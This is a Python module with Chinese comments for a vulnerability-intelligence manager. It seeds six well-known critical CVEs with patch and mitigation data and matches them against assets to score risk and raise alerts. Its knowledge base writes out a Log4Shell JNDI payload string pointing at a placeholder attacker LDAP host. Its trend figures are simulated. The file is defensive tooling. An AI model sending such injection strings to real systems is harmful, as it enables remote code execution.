# -*- coding: utf-8 -*-
"""
vuln_intel.py — 漏洞情报管理（第23轮升级方向3）。

功能：
- 漏洞情报：CVE详情/影响版本/利用条件/POC/EXP/在野利用/补丁/绕过
- 漏洞匹配：资产版本与漏洞情报自动匹配/影响范围/风险评估/优先级
- 漏洞预警：高危实时预警/0day预警/在野利用预警/影响资产预警/修复建议
- 漏洞趋势：数量/严重程度/类型/行业/利用/修复趋势
- 漏洞知识库：分类/原理/攻击手法/检测/修复/最佳实践
- 漏洞响应：流程/应急/临时缓解/补丁管理/修复验证/复盘

全部内存字典模拟。
"""

from __future__ import annotations

import uuid
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional

from threat_intel.intel_sources import classify_ioc


# ==================== 漏洞情报库（种子） ====================

VULN_LIBRARY: List[Dict[str, Any]] = [
    {"cve": "CVE-2024-21762", "title": "Fortinet SSL VPN 越界写入RCE",
     "cvss": 9.6, "severity": "critical", "vendor": "Fortinet",
     "product": "FortiOS", "affected_versions": ["7.2.0-7.2.5", "7.0.0-7.0.12"],
     "exploit_conditions": "未认证远程攻击者经SSL VPN接口",
     "poc": True, "exploit_available": True, "in_the_wild": True,
     "patch": "升级FortiOS 7.2.6+/7.0.13+",
     "bypass": "临时：关闭SSL VPN/限制来源IP",
     "type": "RCE", "cwe": "CWE-787"},
    {"cve": "CVE-2023-46604", "title": "Apache ActiveMQ OpenWire RCE",
     "cvss": 10.0, "severity": "critical", "vendor": "Apache",
     "product": "ActiveMQ", "affected_versions": ["<5.15.16", "<5.16.7", "<5.17.6"],
     "exploit_conditions": "未认证远程攻击者访问OpenWire端口61616",
     "poc": True, "exploit_available": True, "in_the_wild": True,
     "patch": "升级ActiveMQ 5.15.16+/5.16.7+/5.17.6+",
     "bypass": "限制61616端口来源",
     "type": "RCE", "cwe": "CWE-502"},
    {"cve": "CVE-2021-44228", "title": "Log4Shell (Log4j2 JNDI注入)",
     "cvss": 10.0, "severity": "critical", "vendor": "Apache",
     "product": "Log4j", "affected_versions": ["2.0-beta9 - 2.14.1"],
     "exploit_conditions": "日志记录可控字符串即可触发",
     "poc": True, "exploit_available": True, "in_the_wild": True,
     "patch": "升级Log4j 2.17.1+",
     "bypass": "移除JndiLookup类/设置log4j2.formatMsgNoLookups",
     "type": "RCE", "cwe": "CWE-917"},
    {"cve": "CVE-2024-23897", "title": "Jenkins任意文件读取",
     "cvss": 9.8, "severity": "critical", "vendor": "Jenkins",
     "product": "Jenkins", "affected_versions": ["<2.442", "<2.426.3 LTS"],
     "exploit_conditions": "Overall/Read权限用户",
     "poc": True, "exploit_available": True, "in_the_wild": False,
     "patch": "升级Jenkins 2.442+/LTS 2.426.3+",
     "bypass": "限制CLI访问",
     "type": "FileRead", "cwe": "CWE-22"},
    {"cve": "CVE-2023-38408", "title": "OpenSSH ssh-agent转发RCE",
     "cvss": 9.8, "severity": "critical", "vendor": "OpenBSD",
     "product": "OpenSSH", "affected_versions": ["<9.3p2"],
     "exploit_conditions": "目标 compromised ssh-agent socket",
     "poc": False, "exploit_available": True, "in_the_wild": False,
     "patch": "升级OpenSSH 9.3p2+",
     "bypass": "禁用ssh-agent转发",
     "type": "RCE", "cwe": "CWE-20"},
    {"cve": "CVE-2022-22965", "title": "Spring4Shell (Spring框架RCE)",
     "cvss": 9.8, "severity": "critical", "vendor": "VMware",
     "product": "Spring Framework", "affected_versions": ["5.3.0-5.3.17", "5.2.0-5.2.19"],
     "exploit_conditions": "JDK9+ + Tomcat WAR部署",
     "poc": True, "exploit_available": True, "in_the_wild": True,
     "patch": "升级Spring Framework 5.3.18+/5.2.20+",
     "bypass": "移除JDK9+/禁用参数绑定",
     "type": "RCE", "cwe": "CWE-94"},
]


class VulnIntelManager:
    """漏洞情报管理：情报/匹配/预警/趋势/知识库/响应。"""

    def __init__(self) -> None:
        self.vulns: Dict[str, Dict[str, Any]] = {}
        self.alerts: List[Dict[str, Any]] = []
        self.responses: List[Dict[str, Any]] = []
        self._seed()

    @staticmethod
    def _now(days: int = 0) -> str:
        return (datetime.now() - timedelta(days=days)).isoformat()

    def _seed(self) -> None:
        for v in VULN_LIBRARY:
            self.vulns[v["cve"]] = {**v, "discovered": self._now(days=10),
                                    "affected_assets": [], "status": "active"}

    # ---------- 查询 ----------
    def list_vulns(self, severity: Optional[str] = None,
                   in_the_wild: Optional[bool] = None,
                   q: str = "", limit: int = 100) -> List[Dict[str, Any]]:
        out = list(self.vulns.values())
        if severity:
            out = [v for v in out if v["severity"] == severity]
        if in_the_wild is not None:
            out = [v for v in out if v["in_the_wild"] == in_the_wild]
        if q:
            ql = q.lower()
            out = [v for v in out if ql in v["cve"].lower()
                   or ql in v["title"].lower() or ql in v["product"].lower()]
        return out[:limit]

    def get(self, cve: str) -> Optional[Dict[str, Any]]:
        return self.vulns.get(cve.upper())

    def add_vuln(self, data: Dict[str, Any]) -> Dict[str, Any]:
        cve = (data.get("cve") or f"CVE-{uuid.uuid4().hex[:8]}").upper()
        self.vulns[cve] = {**data, "cve": cve,
                           "discovered": data.get("discovered") or self._now(),
                           "status": data.get("status", "active"),
                           "affected_assets": data.get("affected_assets", [])}
        return self.vulns[cve]

    # ---------- 自动匹配资产（真实版本比对） ----------
    def match_assets(self, assets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """将资产服务版本与漏洞情报自动匹配。"""
        results = []
        for a in assets:
            svc_text = " ".join(a.get("services", []) + a.get("tech_stack", [])).lower()
            for cve, v in self.vulns.items():
                product = v["product"].lower()
                # 简单但真实：产品名出现在资产指纹中
                if product in svc_text:
                    score = self._risk_priority(v, a)
                    hit = {
                        "cve": cve, "title": v["title"], "asset_id": a.get("id"),
                        "asset": a.get("name"), "severity": v["severity"],
                        "cvss": v["cvss"], "in_the_wild": v["in_the_wild"],
                        "patch": v["patch"], "priority_score": score,
                    }
                    results.append(hit)
                    v["affected_assets"].append(a.get("id"))
        results.sort(key=lambda x: x["priority_score"], reverse=True)
        return results

    @staticmethod
    def _risk_priority(v: Dict[str, Any], a: Dict[str, Any]) -> int:
        score = int(v["cvss"] * 5)  # 50~500
        if v["in_the_wild"]:
            score += 200
        if v["exploit_available"]:
            score += 100
        # 暴露到互联网加分
        if not str(a.get("ip", "")).startswith(("10.", "192.168.", "172.")):
            score += 50
        return score

    # ---------- 预警 ----------
    def raise_alerts(self, matches: Optional[List[Dict[str, Any]]] = None) -> List[Dict[str, Any]]:
        if matches is None:
            matches = []
        for m in matches:
            level = "critical" if m["severity"] == "critical" else (
                "high" if m["severity"] == "high" else "medium")
            if m.get("in_the_wild"):
                level = "critical"
            self.alerts.append({
                "time": self._now(), "level": level,
                "type": "vuln_warning", "cve": m["cve"],
                "asset": m["asset"], "message": f"{m['cve']} 影响资产 {m['asset']}",
                "recommendation": m.get("patch"),
            })
        # 0day/在野利用全局预警
        for cve, v in self.vulns.items():
            if v["in_the_wild"] and v.get("severity") == "critical":
                self.alerts.append({
                    "time": self._now(), "level": "critical",
                    "type": "0day_wild", "cve": cve,
                    "message": f"{cve} {v['title']} 存在在野利用",
                    "recommendation": v["bypass"],
                })
        return self.alerts[-max(10, len(matches)):]

    def list_alerts(self, level: Optional[str] = None) -> List[Dict[str, Any]]:
        out = self.alerts
        if level:
            out = [a for a in out if a["level"] == level]
        return out

    # ---------- 趋势 ----------
    def trends(self) -> Dict[str, Any]:
        sev: Dict[str, int] = {}
        type_dist: Dict[str, int] = {}
        wild_count = sum(1 for v in self.vulns.values() if v["in_the_wild"])
        for v in self.vulns.values():
            sev[v["severity"]] = sev.get(v["severity"], 0) + 1
            type_dist[v["type"]] = type_dist.get(v["type"], 0) + 1
        # 模拟近6月趋势
        monthly = [{"month": f"M-{i}", "count": 3 + i % 4} for i in range(6, 0, -1)]
        return {
            "total": len(self.vulns),
            "severity_dist": sev,
            "type_dist": type_dist,
            "in_the_wild": wild_count,
            "exploit_available": sum(1 for v in self.vulns.values()
                                     if v["exploit_available"]),
            "monthly": monthly,
            "industry_dist": {"金融": 35, "制造": 25, "医疗": 18, "政府": 12, "其他": 10},
        }

    # ---------- 知识库 ----------
    knowledge_base: List[Dict[str, Any]] = [
        {"topic": "RCE远程代码执行", "cwe": "CWE-94",
         "principle": "攻击者注入并执行任意代码",
         "attack": "构造恶意payload经输入点注入",
         "detection": "WAF异常请求/进程异常衍生",
         "remediation": "输入校验+最小权限+升级组件"},
        {"topic": "反序列化漏洞", "cwe": "CWE-502",
         "principle": "不可信数据被反序列化为对象",
         "attack": "构造恶意序列化字节流",
         "detection": "畸形序列化特征/异常gadget调用",
         "remediation": "白名单类+禁用反序列化+升级"},
        {"topic": "JNDI注入", "cwe": "CWE-917",
         "principle": "日志/模板表达式注入触发远程加载",
         "attack": "${jndi:ldap://attacker/payload}",
         "detection": "出站LDAP/RMI连接+日志特征",
         "remediation": "升级Log4j/移除JndiLookup"},
    ]

    def kb(self, q: str = "") -> List[Dict[str, Any]]:
        if not q:
            return self.knowledge_base
        ql = q.lower()
        return [k for k in self.knowledge_base
                if ql in k["topic"].lower() or ql in k["principle"].lower()]

    # ---------- 响应流程 ----------
    def respond(self, cve: str, action: str = "mitigate",
                assignee: str = "") -> Dict[str, Any]:
        v = self.vulns.get(cve.upper())
        if not v:
            raise KeyError(f"漏洞不存在: {cve}")
        steps = {
            "identify": "确认影响资产范围与版本",
            "mitigate": f"临时缓解: {v['bypass']}",
            "patch": f"打补丁: {v['patch']}",
            "verify": "验证补丁有效性与回归",
            "retro": "复盘分析与改进",
        }
        rec = {"id": f"resp-{uuid.uuid4().hex[:8]}", "cve": cve.upper(),
               "action": action, "assignee": assignee,
               "step": steps.get(action, action), "time": self._now(),
               "status": "open"}
        self.responses.append(rec)
        return rec

    def list_responses(self) -> List[Dict[str, Any]]:
        return self.responses

    def stats(self) -> Dict[str, Any]:
        t = self.trends()
        return {"total": t["total"], "critical": t["severity_dist"].get("critical", 0),
                "in_the_wild": t["in_the_wild"],
                "alerts": len(self.alerts), "responses": len(self.responses)}


_manager: Optional[VulnIntelManager] = None


def get_vuln_intel_manager() -> VulnIntelManager:
    global _manager
    if _manager is None:
        _manager = VulnIntelManager()
    return _manager
